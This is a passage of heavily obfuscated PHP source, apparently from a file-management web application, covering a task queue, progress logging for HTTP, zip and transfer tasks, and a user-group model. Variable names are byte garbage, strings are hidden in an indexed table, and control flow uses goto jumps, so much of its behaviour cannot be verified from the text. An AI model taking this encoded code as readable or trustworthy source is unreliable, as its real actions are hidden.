setModel($ªÄÇ­”©) { $this->model = $ªÄÇ­”©; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto a–‰àì‡Ï¨; e«¿Ş•õäå: function binCheckBigger($¹òëüµŠ, $¹¬úáå‰) { return $¹òëüµŠ > $¹¬úáå‰; } $_SERVER[$_SERVER[ÓÄÍòáÒ][3]] = ("\70\65\60\70"."\61\65")+0;$_f6cl="v3qr5aothx4wskcf08269yngpdbmiez7u1jlhosdqw79r056zgenjblf34k8y2caiv1mxuptpkebfa8ldu";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ˆ·óšä°, $ï’æã¨) { $¬Ô¾ÃÏ =& $_SERVER[¿ğÚ‰±–]; if (isset(self::$_methodList[$ˆ·óšä°])) { return @call_user_func_array(self::$_methodList[$ˆ·óšä°], $ï’æã¨); } else { if (method_exists($this, $ˆ·óšä°)) { return call_user_func_array(array($this, $ˆ·óšä°), $ï’æã¨); } else { think_exception(__CLASS__ . $¬Ô¾ÃÏ[4] . $ˆ·óšä° . $¬Ô¾ÃÏ[5]); } } } public static function __callStatic($›ö§³´¤, $İ¸ò‰«) { if (isset(self::$_methodListStatic[$›ö§³´¤])) { return call_user_func_array(self::$_methodListStatic[$›ö§³´¤], $İ¸ò‰«); } else { if (method_exists(self, $›ö§³´¤)) { return call_user_func_array(array(self, $›ö§³´¤), $İ¸ò‰«); } else { show_json("{$›ö§³´¤}\x28\x29\40\x6e\x6f\164\40\145\x78\x69\163\x74\73", !1); } } } public static function addMethod($›ªÎ­ú¨, $ù³¨ğñ) { self::$_methodList[$›ªÎ­ú¨] = $ù³¨ğñ; } public static function addMethodStatic($¢Õ¤ÛãÂ, $¸·ı É·) { self::$_methodListStatic[$¢Õ¤ÛãÂ] = $¸·ı É·; } } goto A£è§¼‹¦º; FãäÓ”·Ôå: class TaskHttp extends Task { protected function startAfter() { $Ü¹Àµ´’ =& $_SERVER[¿ğÚ‰±–]; $Ëà«‡Ó‘ =& $this->task; $Ëà«‡Ó‘[$Ü¹Àµ´’[1854]] = 1; Hook::bind($Ü¹Àµ´’[1822], array($this, $Ü¹Àµ´’[1855])); Hook::bind($Ü¹Àµ´’[1824], array($this, $Ü¹Àµ´’[1856])); Hook::bind($Ü¹Àµ´’[1826], array($this, $Ü¹Àµ´’[1857])); } protected function endAfter() { $à¶µ²…‘ =& $_SERVER[¿ğÚ‰±–]; Hook::unbind($à¶µ²…‘[1822], array($this, $à¶µ²…‘[1855])); Hook::unbind($à¶µ²…‘[1824], array($this, $à¶µ²…‘[1856])); Hook::unbind($à¶µ²…‘[1826], array($this, $à¶µ²…‘[1857])); } public function progressStart($ËîÅ´¦ü) { $¡¨Üş‹Ğ =& $_SERVER[¿ğÚ‰±–]; $ßªøšÛØ = curl_getinfo($ËîÅ´¦ü); self::log($¡¨Üş‹Ğ[1858] . $ßªøšÛØ[$¡¨Üş‹Ğ[383]]); self::valueSet($this->task[$¡¨Üş‹Ğ[475]], $this->task); } public function progressEnd($×’ä ³Ÿ) { $ô¶Ü‹ò =& $_SERVER[¿ğÚ‰±–]; self::log($ô¶Ü‹ò[1859] . $this->task[$ô¶Ü‹ò[475]]); $this->end(); } public function progress($ôÑÊì·², $ÛÙ¯óõ¤, $™‰”á€, $ôí»˜´Á, $“ï—šù) { $ë¤·¸ÆÙ =& $_SERVER[¿ğÚ‰±–]; $°™½ÇÌÑ =& $this->task; if ($“ï—šù > 0) { $°™½ÇÌÑ[$ë¤·¸ÆÙ[1148]] = $°™½ÇÌÑ[$ë¤·¸ÆÙ[1148]] == 0 ? $ôí»˜´Á : $°™½ÇÌÑ[$ë¤·¸ÆÙ[1148]]; $°™½ÇÌÑ[$ë¤·¸ÆÙ[1778]] = $“ï—šù; } else { if ($™‰”á€ > 0) { $°™½ÇÌÑ[$ë¤·¸ÆÙ[1148]] = $°™½ÇÌÑ[$ë¤·¸ÆÙ[1148]] == 0 ? $ÛÙ¯óõ¤ : $°™½ÇÌÑ[$ë¤·¸ÆÙ[1148]]; $°™½ÇÌÑ[$ë¤·¸ÆÙ[1778]] = $™‰”á€; } } $this->update(); self::log("\160\162\x6f\x67\162\x65\x73\x73\x48\164\164\x70\x3a\x64\x6f\x77\x6e\x3a{$™‰”á€}\57{$ÛÙ¯óõ¤}\x3b\40\165\160\x6c\x6f\141\x64\72{$“ï—šù}\57{$ôí»˜´Á}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Å…Ñï¢Í, $Ÿìùî“í = '', $Ó³êãİÀ = 0, $ÁÈé©‹ = '') { $´–ñšğº =& $_SERVER[¿ğÚ‰±–]; $ÁÈé©‹ = $ÁÈé©‹ ? $ÁÈé©‹ : ($Ÿìùî“í ? $Ÿìùî“í : $Å…Ñï¢Í); $«ûÑÎÌ† = new Task($Å…Ñï¢Í, $Ÿìùî“í, $Ó³êãİÀ, $ÁÈé©‹); $GLOBALS[$´–ñšğº[1860] . $Å…Ñï¢Í] = new TaskLog($´–ñšğº[1761], $«ûÑÎÌ†, $ÁÈé©‹); return $«ûÑÎÌ†; } public function __construct($–íÔ…‚ = '', $œª¹Ûöµ = '', $¬¬á´‰Ö = '') { $âäî—£ˆ =& $_SERVER[¿ğÚ‰±–]; if (!$–íÔ…‚) { $–íÔ…‚ = $âäî—£ˆ[1761]; } $ÎÇÜ¨ûÖ = $–íÔ…‚ . $âäî—£ˆ[462] . rand_string(10); if (!$¬¬á´‰Ö) { $¬¬á´‰Ö = $–íÔ…‚ . $âäî—£ˆ[53] . $¬¬á´‰Ö; } switch ($–íÔ…‚) { case $âäî—£ˆ[1761]: if (!$œª¹Ûöµ || !$œª¹Ûöµ->task) { return echoLog($–íÔ…‚ . $âäî—£ˆ[1861]); } $Ìå³˜¿„ = $œª¹Ûöµ; $ÎÇÜ¨ûÖ = $Ìå³˜¿„->task[$âäî—£ˆ[475]]; $–íÔ…‚ = $Ìå³˜¿„->task[$âäî—£ˆ[475]]; if (!$Ìå³˜¿„->task[$âäî—£ˆ[1666]]) { $Ìå³˜¿„->task[$âäî—£ˆ[1666]] = $¬¬á´‰Ö ? $¬¬á´‰Ö : $–íÔ…‚; } break; case $âäî—£ˆ[1862]: if (!$œª¹Ûöµ) { return echoLog($–íÔ…‚ . $âäî—£ˆ[1863]); } $æÄáÉ¶­ = is_string($œª¹Ûöµ) ? array($œª¹Ûöµ) : $œª¹Ûöµ; $Ìå³˜¿„ = new TaskFileTransfer($ÎÇÜ¨ûÖ, $–íÔ…‚, 0, $¬¬á´‰Ö ? $¬¬á´‰Ö : $æÄáÉ¶­[0]); foreach ($æÄáÉ¶­ as $íÉ«î®) { $Ìå³˜¿„->addPath($íÉ«î®); } break; case $âäî—£ˆ[389]: if (!$œª¹Ûöµ) { return echoLog($–íÔ…‚ . $âäî—£ˆ[1863]); } $æÄáÉ¶­ = is_string($œª¹Ûöµ) ? array($œª¹Ûöµ) : $œª¹Ûöµ; $Ìå³˜¿„ = new TaskZip($ÎÇÜ¨ûÖ, $–íÔ…‚, 0, $¬¬á´‰Ö ? $¬¬á´‰Ö : $æÄáÉ¶­[0]); foreach ($æÄáÉ¶­ as $íÉ«î®) { $Ìå³˜¿„->addPath($íÉ«î®); } break; case $âäî—£ˆ[1306]: if (!$œª¹Ûöµ) { return echoLog($–íÔ…‚ . $âäî—£ˆ[1863]); } $Ìå³˜¿„ = new TaskUnZip($ÎÇÜ¨ûÖ, $–íÔ…‚, 0, $¬¬á´‰Ö ? $¬¬á´‰Ö : $œª¹Ûöµ); if ($œª¹Ûöµ) { $Ìå³˜¿„->addFile($œª¹Ûöµ); } break; case $âäî—£ˆ[152]: $Ìå³˜¿„ = new TaskHttp($ÎÇÜ¨ûÖ, $–íÔ…‚); break; default: return; break; } $this->task = $Ìå³˜¿„; $this->taskID = $ÎÇÜ¨ûÖ; Hook::bind($âäî—£ˆ[1798], array($this, $âäî—£ˆ[1864])); Hook::bind($âäî—£ˆ[1800], array($this, $âäî—£ˆ[1865])); Hook::bind($âäî—£ˆ[1794], array($this, $âäî—£ˆ[1866])); echoLog($âäî—£ˆ[1867] . $Ìå³˜¿„->task[$âäî—£ˆ[1666]]); } public function __destruct() { $this->end(); } public function end($°Ó¬Â–¼ = '') { $ó€¦è¬Ô =& $_SERVER[¿ğÚ‰±–]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($°Ó¬Â–¼); $this->task = !1; $this->taskID = !1; Hook::unbind($ó€¦è¬Ô[1798], array($this, $ó€¦è¬Ô[1864])); Hook::unbind($ó€¦è¬Ô[1800], array($this, $ó€¦è¬Ô[1865])); Hook::unbind($ó€¦è¬Ô[1794], array($this, $ó€¦è¬Ô[1866])); } public function taskUpdate($ù°ßÃÂæ) { $ö·…ßå =& $_SERVER[¿ğÚ‰±–]; if (!$ù°ßÃÂæ || $this->taskID != $ù°ßÃÂæ[$ö·…ßå[475]]) { return; } $ë•„¶æ = 20; $·¾ÇÎÙ = intval($ù°ßÃÂæ[$ö·…ßå[1779]] * $ë•„¶æ); $ƒàĞŠºÈ = $ö·…ßå[176] . str_repeat($ö·…ßå[967], $·¾ÇÎÙ) . $ö·…ßå[1099] . str_repeat($ö·…ßå[53], $ë•„¶æ - $·¾ÇÎÙ) . $ö·…ßå[178]; $™ã†»àú = $ƒàĞŠºÈ . sprintf($ö·…ßå[1868], $ù°ßÃÂæ[$ö·…ßå[1779]] * 100) . $ö·…ßå[1869]; $í¢“ãï… = $™ã†»àú . $ù°ßÃÂæ[$ö·…ßå[1778]] . $ö·…ßå[8] . $ù°ßÃÂæ[$ö·…ßå[1148]] . LNG($ö·…ßå[1870]); $ŠÏŞšÍ = $ö·…ßå[12]; if ($ù°ßÃÂæ[$ö·…ßå[1854]]) { $í¢“ãï… = $™ã†»àú . size_format($ù°ßÃÂæ[$ö·…ßå[1778]]) . $ö·…ßå[8] . size_format($ù°ßÃÂæ[$ö·…ßå[1148]]); $ŠÏŞšÍ = size_format($ù°ßÃÂæ[$ö·…ßå[1780]]) . $ö·…ßå[1871]; } if ($ù°ßÃÂæ[$ö·…ßå[1150]]) { $ù°ßÃÂæ[$ö·…ßå[1828]] = $ù°ßÃÂæ[$ö·…ßå[1150]] . $ö·…ßå[53] . $ù°ßÃÂæ[$ö·…ßå[1828]]; } if ($ù°ßÃÂæ[$ö·…ßå[1828]]) { $Û…ä©¥ = $ö·…ßå[12]; if ($ù°ßÃÂæ[$ö·…ßå[1830]]) { $Û…ä©¥ = $ö·…ßå[50] . size_format($ù°ßÃÂæ[$ö·…ßå[1831]]) . $ö·…ßå[8] . size_format($ù°ßÃÂæ[$ö·…ßå[1830]]); } $ŠÏŞšÍ .= $ù°ßÃÂæ[$ö·…ßå[1828]] . $Û…ä©¥; } if ($ù°ßÃÂæ[$ö·…ßå[841]] && !$ù°ßÃÂæ[$ö·…ßå[1830]]) { $ŠÏŞšÍ .= $ö·…ßå[53] . size_format($ù°ßÃÂæ[$ö·…ßå[1835]]) . $ö·…ßå[8] . size_format($ù°ßÃÂæ[$ö·…ßå[841]]); } echoLog($í¢“ãï… . $ö·…ßå[53] . $ŠÏŞšÍ, !0); } public function taskEnd($×å¯Ëàó) { $ñ±†ºÉµ =& $_SERVER[¿ğÚ‰±–]; if (!$×å¯Ëàó || $this->taskID != $×å¯Ëàó[$ñ±†ºÉµ[475]]) { return; } $ê¶Î„® = $×å¯Ëàó ? $×å¯Ëàó[$ñ±†ºÉµ[1778]] . $ñ±†ºÉµ[8] . $×å¯Ëàó[$ñ±†ºÉµ[1148]] . LNG($ñ±†ºÉµ[1870]) . $ñ±†ºÉµ[74] : $ñ±†ºÉµ[12]; echoLog($ñ±†ºÉµ[1872] . $×å¯Ëàó[$ñ±†ºÉµ[1666]] . ($×å¯Ëàó[$ñ±†ºÉµ[526]] ? $ñ±†ºÉµ[74] . $×å¯Ëàó[$ñ±†ºÉµ[526]] : $ñ±†ºÉµ[12]) . $ñ±†ºÉµ[74] . $ê¶Î„® . $ñ±†ºÉµ[1873] . sprintf($ñ±†ºÉµ[928], timeFloat() - $×å¯Ëàó[$ñ±†ºÉµ[1781]]) . $ñ±†ºÉµ[1793]); $this->end(); } public function taskKill($ œ—‡ëà) { $´½ÄùÖâ =& $_SERVER[¿ğÚ‰±–]; if (!$ œ—‡ëà || $this->taskID != $ œ—‡ëà[$´½ÄùÖâ[475]]) { return; } echoLog($´½ÄùÖâ[1874] . $ œ—‡ëà[$´½ÄùÖâ[1666]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\121\165\145\165\x65\114\145\x6e\x67\164\x68"; const QUEUE_DATA = "\164\141\x73\x6b\x51\x75\145\165\145\x44\x61\164\141"; const QUEUE_TIME = "\x74\141\x73\x6b\x51\165\x65\165\x65\x4c\141\x73\164\122\165\x6e"; const QUEUE_THREAD = "\x74\x61\x73\x6b\121\165\145\165\x65\x54\150\162\x65\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($íŠ’èŸ–, $»ş”Ÿà = array(), $Ğæ¼†š  = '', $ö™ÓßÑ = '') { $‰ë¯È› =& $_SERVER[¿ğÚ‰±–]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ö™ÓßÑ && array_find_by_field(self::$listData, $‰ë¯È›[97], $ö™ÓßÑ)) { return !0; } if ($ö™ÓßÑ && array_find_by_field(self::$listDataAdd, $‰ë¯È›[97], $ö™ÓßÑ)) { return !0; } self::$listDataAdd[] = array($‰ë¯È›[341] => $íŠ’èŸ–, $‰ë¯È›[1875] => $»ş”Ÿà, $‰ë¯È›[526] => $Ğæ¼†š , $‰ë¯È›[97] => $ö™ÓßÑ); return !0; } public static function addSubmit() { $ÃÚ•ì©Û =& $_SERVER[¿ğÚ‰±–]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ÃÚ•ì©Û[1876] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ÃÚ•ì©Û[12], $ÃÚ•ì©Û[526])), $ÃÚ•ì©Û[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ìê¯êÜ¢, $–€€Ğ = array(), $Â×µ¬Ú = '', $ŠÅêĞÃ› = '') { $ÆßÀ¤·Ÿ =& $_SERVER[¿ğÚ‰±–]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Š¿ôÈ¤ö = self::getAll(); if ($ŠÅêĞÃ› && array_find_by_field($Š¿ôÈ¤ö, $ÆßÀ¤·Ÿ[97], $ŠÅêĞÃ›)) { return !0; } $Š¿ôÈ¤ö[] = array($ÆßÀ¤·Ÿ[341] => $ìê¯êÜ¢, $ÆßÀ¤·Ÿ[1875] => $–€€Ğ, $ÆßÀ¤·Ÿ[526] => $Â×µ¬Ú, $ÆßÀ¤·Ÿ[97] => $ŠÅêĞÃ›); self::setAll($Š¿ôÈ¤ö); write_log($ÆßÀ¤·Ÿ[1876] . $Â×µ¬Ú, $ÆßÀ¤·Ÿ[197]); return !0; } public static function run() { $¶‚ÒŞ¼’ =& $_SERVER[¿ğÚ‰±–]; $àÍñÉ§Š = self::getAll(); $¯¤Ò½œ¶ = array_shift($àÍñÉ§Š); if (!$¯¤Ò½œ¶) { return !1; } self::setAll($àÍñÉ§Š); $ÄğÎ‹Ÿ‹ = timeFloat(); $ßÎ“Æ“µ = $¶‚ÒŞ¼’[12]; try { $ßÎ“Æ“µ = Hook::apply($¯¤Ò½œ¶[$¶‚ÒŞ¼’[341]], $¯¤Ò½œ¶[$¶‚ÒŞ¼’[1875]]); } catch (Exception $š®—êÏ÷) { write_log($š®—êÏ÷, $¶‚ÒŞ¼’[1271]); } $’Çö©Õó = number_format(timeFloat() - $ÄğÎ‹Ÿ‹, 3) . $¶‚ÒŞ¼’[1793]; if ($ßÎ“Æ“µ && is_string($ßÎ“Æ“µ)) { $’Çö©Õó = $’Çö©Õó . $¶‚ÒŞ¼’[1877] . $ßÎ“Æ“µ; } write_log($¶‚ÒŞ¼’[1878] . $¯¤Ò½œ¶[$¶‚ÒŞ¼’[526]] . $¶‚ÒŞ¼’[1879] . $’Çö©Õó, $¶‚ÒŞ¼’[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $˜çıùªı =& $_SERVER[¿ğÚ‰±–]; $’›£ì­¿ = self::threadCount() + 1; if ($’›£ì­¿ > 3 || !self::count()) { return; } write_log($˜çıùªı[1880] . $’›£ì­¿, $˜çıùªı[197]); Cache::set(self::QUEUE_THREAD, $’›£ì­¿, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($˜çıùªı[1881], $˜çıùªı[197]); } public static function getKey($²ñãúŸ, $ÖşäŒàü = "\151\156\164") { $ÔÑ÷ŠÒÍ =& $_SERVER[¿ğÚ‰±–]; Cache::removeMemory($²ñãúŸ); $ùé¿À–ë = Cache::get($²ñãúŸ); if ($ÖşäŒàü == $ÔÑ÷ŠÒÍ[364]) { return $ùé¿À–ë ? intval($ùé¿À–ë) : 0; } if ($ÖşäŒàü == $ÔÑ÷ŠÒÍ[1882]) { return is_array($ùé¿À–ë) ? $ùé¿À–ë : array(); } return $ùé¿À–ë; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¿ğÚ‰±–][1882]); } public static function setAll($àá£àõú) { $¹“ÎêÜÜ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($àá£àõú), $¹“ÎêÜÜ); Cache::set(self::QUEUE_DATA, $àá£àõú, $¹“ÎêÜÜ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto C‡‘ˆó›Çæ; EŠèªÖàšÓ: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\160"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\x6d\145" => "\147\162\157\x75\x70\x5f\155\x65\164\141", "\155\x65\x74\x61\x46\151\145\154\x64" => "\x67\x72\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($öíÂã¼) { $Ôô‘“Ö€ =& $_SERVER[¿ğÚ‰±–]; return array($Ôô‘“Ö€[2058] => array($öíÂã¼[0], $Ôô‘“Ö€[2059]), $Ôô‘“Ö€[2060] => array($öíÂã¼[0], $Ôô‘“Ö€[2061])); } protected function getInfo($àŠÛŞø£, $Œ²ĞÅ¶š = false) { $õÃÅì™ = $this->getInfoSimple($àŠÛŞø£); if (!$õÃÅì™) { return !1; } if ($Œ²ĞÅ¶š) { return $this->_listDataApplyItem($õÃÅì™); } return $this->cacheFunctionGet($_SERVER[¿ğÚ‰±–][2062], $àŠÛŞø£); } protected function getInfoSimple($Û…ÁÈšÎ, $üêô×øĞ = false) { $ÄÜñÕ±Ú =& $_SERVER[¿ğÚ‰±–]; if ($üêô×øĞ) { $¿êÏæÖ = array($ÄÜñÕ±Ú[1976] => intval($Û…ÁÈšÎ)); $‘È·ùÌÎ = $this->where($¿êÏæÖ)->find(); return is_array($‘È·ùÌÎ) ? $‘È·ùÌÎ : array(); } return $this->cacheFunctionGet($ÄÜñÕ±Ú[2063], $Û…ÁÈšÎ); } protected function groupAdd($êÑ‡è) { $‡ğ±ß˜Ş =& $_SERVER[¿ğÚ‰±–]; if (!$êÑ‡è[$‡ğ±ß˜Ş[192]] && isset($êÑ‡è[$‡ğ±ß˜Ş[1976]]) && $êÑ‡è[$‡ğ±ß˜Ş[1976]] == 1) { if ($¼ã…è–² = $this->getInfoSimple($êÑ‡è[$‡ğ±ß˜Ş[1976]], !0)) { return $êÑ‡è[$‡ğ±ß˜Ş[1976]]; } } else { $¼ã…è–² = $this->getInfoSimple($êÑ‡è[$‡ğ±ß˜Ş[192]]); if (!$¼ã…è–²) { return !1; } } $‘ï¹†Ãû = $‡ğ±ß˜Ş[594]; if ($¼ã…è–²[$‡ğ±ß˜Ş[584]]) { $‘ï¹†Ãû = $¼ã…è–²[$‡ğ±ß˜Ş[584]] . $¼ã…è–²[$‡ğ±ß˜Ş[1976]] . $‡ğ±ß˜Ş[50]; } $Š˜«é±ş = array($‡ğ±ß˜Ş[494] => $this->groupNameAuto($êÑ‡è[$‡ğ±ß˜Ş[192]], $êÑ‡è[$‡ğ±ß˜Ş[32]]), $‡ğ±ß˜Ş[477] => $êÑ‡è[$‡ğ±ß˜Ş[192]], $‡ğ±ß˜Ş[652] => $‘ï¹†Ãû, $‡ğ±ß˜Ş[2064] => $êÑ‡è[$‡ğ±ß˜Ş[1962]], $‡ğ±ß˜Ş[2065] => 0, $‡ğ±ß˜Ş[1980] => 0); if (isset($êÑ‡è[$‡ğ±ß˜Ş[2000]])) { $Š˜«é±ş[$‡ğ±ß˜Ş[2000]] = $êÑ‡è[$‡ğ±ß˜Ş[2000]]; } else { $éäÍœõ” = $this->max($‡ğ±ß˜Ş[2000]); if (!$éäÍœõ”) { $éäÍœõ” = 0; } $Š˜«é±ş[$‡ğ±ß˜Ş[2000]] = $éäÍœõ” + 1; } if (!empty($êÑ‡è[$‡ğ±ß˜Ş[1976]])) { $Š˜«é±ş[$‡ğ±ß˜Ş[1976]] = $êÑ‡è[$‡ğ±ß˜Ş[1976]]; } $å¥§é©¨ = $this->add($Š˜«é±ş); $this->setNamePinyin($å¥§é©¨, $Š˜«é±ş[$‡ğ±ß˜Ş[32]]); if (isset($êÑ‡è[$‡ğ±ß˜Ş[2066]])) { $this->metaSet($å¥§é©¨, array($‡ğ±ß˜Ş[2066] => $êÑ‡è[$‡ğ±ß˜Ş[2066]], $‡ğ±ß˜Ş[2067] => $êÑ‡è[$‡ğ±ß˜Ş[2067]])); unset($êÑ‡è[$‡ğ±ß˜Ş[2066]]); unset($êÑ‡è[$‡ğ±ß˜Ş[2067]]); } Model($‡ğ±ß˜Ş[1425])->groupRootAdd($å¥§é©¨); $this->_clearCache($êÑ‡è[$‡ğ±ß˜Ş[192]]); return $å¥§é©¨; } protected function groupEdit($ê³˜ëöÇ, $á¿¼ˆ•±) { $Áõô‚¤ë =& $_SERVER[¿ğÚ‰±–]; $ÑğßêË… = $this->getInfoSimple($ê³˜ëöÇ); if (!$ÑğßêË…) { return !1; } if (!empty($á¿¼ˆ•±[$Áõô‚¤ë[192]])) { $’«¹ÚÜî = $this->getInfoSimple($á¿¼ˆ•±[$Áõô‚¤ë[192]]); if (!$’«¹ÚÜî) { return !1; } if ($ÑğßêË…[$Áõô‚¤ë[1976]] == $’«¹ÚÜî[$Áõô‚¤ë[1976]]) { return !1; } if ($á¿¼ˆ•±[$Áõô‚¤ë[192]] != $ÑğßêË…[$Áõô‚¤ë[192]]) { if ($’«¹ÚÜî[$Áõô‚¤ë[584]] !== $ÑğßêË…[$Áõô‚¤ë[584]] && strpos($’«¹ÚÜî[$Áõô‚¤ë[584]], $ÑğßêË…[$Áõô‚¤ë[584]] . $ÑğßêË…[$Áõô‚¤ë[1976]] . $Áõô‚¤ë[50]) === 0) { return !1; } $á¿¼ˆ•±[$Áõô‚¤ë[652]] = $’«¹ÚÜî[$Áõô‚¤ë[584]] . $á¿¼ˆ•±[$Áõô‚¤ë[192]] . $Áõô‚¤ë[50]; $this->_changeChildLevel($ÑğßêË…, $’«¹ÚÜî); $this->_clearCache($’«¹ÚÜî[$Áõô‚¤ë[1976]]); $this->_clearCache($ÑğßêË…[$Áõô‚¤ë[192]]); } } if (isset($á¿¼ˆ•±[$Áõô‚¤ë[32]])) { $this->setNamePinyin($ê³˜ëöÇ, $á¿¼ˆ•±[$Áõô‚¤ë[32]]); } if (isset($á¿¼ˆ•±[$Áõô‚¤ë[2066]])) { $this->metaSet($ê³˜ëöÇ, array($Áõô‚¤ë[2066] => $á¿¼ˆ•±[$Áõô‚¤ë[2066]], $Áõô‚¤ë[2067] => $á¿¼ˆ•±[$Áõô‚¤ë[2067]])); unset($á¿¼ˆ•±[$Áõô‚¤ë[2066]]); unset($á¿¼ˆ•±[$Áõô‚¤ë[2067]]); } $this->_clearChildrenCache($ÑğßêË…); return $this->where(array($Áõô‚¤ë[2068] => $ê³˜ëöÇ))->save($á¿¼ˆ•±); } private function _clearChildrenCache($¹ş€âé) { $”ßğ„Ãñ =& $_SERVER[¿ğÚ‰±–]; $ËÉ‘ñ¶å = array($”ßğ„Ãñ[652] => array($”ßğ„Ãñ[612], $¹ş€âé[$”ßğ„Ãñ[584]] . $¹ş€âé[$”ßğ„Ãñ[1976]] . $”ßğ„Ãñ[613])); $±ãÎÍÛ³ = $this->field($”ßğ„Ãñ[1976])->where($ËÉ‘ñ¶å)->select(); foreach ($±ãÎÍÛ³ as $û¢Èõ™) { $this->_clearCache($û¢Èõ™[$”ßğ„Ãñ[1976]]); } } private function _clearCache($£–Šš¯) { $ÙëÀ…ô’ =& $_SERVER[¿ğÚ‰±–]; $this->cacheFunctionClear($ÙëÀ…ô’[2062], $£–Šš¯); $this->cacheFunctionClear($ÙëÀ…ô’[2063], $£–Šš¯); } private function _changeChildLevel($ËÕ±Â†Ï, $…ıÛ­ú¼, $ï»õ«Ò = false) { $Ø°Å§îö =& $_SERVER[¿ğÚ‰±–]; $ƒ¦ê®”‰ = $ËÕ±Â†Ï[$Ø°Å§îö[584]] . $ËÕ±Â†Ï[$Ø°Å§îö[1976]] . $Ø°Å§îö[50]; $ê˜ş±ï¬ = $…ıÛ­ú¼[$Ø°Å§îö[584]] . $…ıÛ­ú¼[$Ø°Å§îö[1976]] . $Ø°Å§îö[50] . $ËÕ±Â†Ï[$Ø°Å§îö[1976]] . $Ø°Å§îö[50]; if ($ï»õ«Ò) { $ê˜ş±ï¬ = $…ıÛ­ú¼[$Ø°Å§îö[584]] . $…ıÛ­ú¼[$Ø°Å§îö[1976]] . $Ø°Å§îö[50]; } $æÀ‰å» = array($Ø°Å§îö[652] => array($Ø°Å§îö[612], $ËÕ±Â†Ï[$Ø°Å§îö[584]] . $ËÕ±Â†Ï[$Ø°Å§îö[1976]] . $Ø°Å§îö[613])); $‚ªƒ®„‘ = array($Ø°Å§îö[652] => array($Ø°Å§îö[661], "\162\x65\160\x6c\x61\143\x65\x28\160\x61\162\145\x6e\164\114\145\166\x65\x6c\x2c\47{$ƒ¦ê®”‰}\47\54\x27{$ê˜ş±ï¬}\47\x29")); $this->_clearChildrenCache($ËÕ±Â†Ï); $this->where($æÀ‰å»)->data($‚ªƒ®„‘)->save(); } public function setNamePinyin($ŠïÅÊåÖ, $ÀÎ©‹ = false) { $•Á˜æûß =& $_SERVER[¿ğÚ‰±–]; if (!$ÀÎ©‹) { $äå©Â = $this->getInfoSimple($ŠïÅÊåÖ); $ÀÎ©‹ = $äå©Â[$•Á˜æûß[32]]; } if (!Input::check($ÀÎ©‹, $•Á˜æûß[655])) { $this->metaSet($ŠïÅÊåÖ, $•Á˜æûß[538], null); $this->metaSet($ŠïÅÊåÖ, $•Á˜æûß[537], null); return; } $Ò²Àà„Ğ = array($•Á˜æûß[538] => str_replace($•Á˜æûß[53], $•Á˜æûß[12], Pinyin::get($ÀÎ©‹)), $•Á˜æûß[537] => Pinyin::get($ÀÎ©‹, $•Á˜æûß[656])); $this->metaSet($ŠïÅÊåÖ, $Ò²Àà„Ğ); } protected function groupStatus($ÇŒİÃµ¦, $Œ½¡šÌ÷) { $õó•½­ =& $_SERVER[¿ğÚ‰±–]; $ı½ŸàÖµ = $this->getInfoSimple($ÇŒİÃµ¦); if (!$ı½ŸàÖµ) { return !1; } $this->_clearCache($ÇŒİÃµ¦); return $this->metaSet($ÇŒİÃµ¦, $õó•½­[828], $Œ½¡šÌ÷); if ($Œ½¡šÌ÷ == $õó•½­[91]) { $¦íÎóÜÆ = $this->parentLevelArray($ı½ŸàÖµ[$õó•½­[584]]); } else { } $¦íÎóÜÆ[] = $ı½ŸàÖµ[$õó•½­[1976]]; $Ğ¦šôúœ = array(); foreach ($¦íÎóÜÆ as $ÇŒİÃµ¦) { $Ğ¦šôúœ[] = array($õó•½­[1976] => $ÇŒİÃµ¦, $õó•½­[97] => $õó•½­[828], $õó•½­[450] => $Œ½¡šÌ÷); $this->_clearCache($ÇŒİÃµ¦); } return Model($õó•½­[2069])->addAll($Ğ¦šôúœ, array(), !0); } protected function groupRemove($½Ëãå›µ, $Œ¿ä¢×“ = false) { $ÃóŠÛòù =& $_SERVER[¿ğÚ‰±–]; $é£şÍí¾ = array($ÃóŠÛòù[1976] => $½Ëãå›µ); $Äº¤èˆ = $this->where($é£şÍí¾)->find(); if (!$Äº¤èˆ || $Äº¤èˆ[$ÃóŠÛòù[192]] == 0) { return !1; } if (!$Œ¿ä¢×“) { $˜Îä˜ÇÔ = $this->getInfoSimple($Äº¤èˆ[$ÃóŠÛòù[192]]); $this->_changeChildLevel($Äº¤èˆ, $˜Îä˜ÇÔ, !0); $this->where(array($ÃóŠÛòù[192] => $½Ëãå›µ))->save(array($ÃóŠÛòù[192] => $Äº¤èˆ[$ÃóŠÛòù[192]])); $this->_clearCache($˜Îä˜ÇÔ[$ÃóŠÛòù[1976]]); } Model($ÃóŠÛòù[2069])->where($é£şÍí¾)->delete(); Model($ÃóŠÛòù[2070])->where($é£şÍí¾)->delete(); 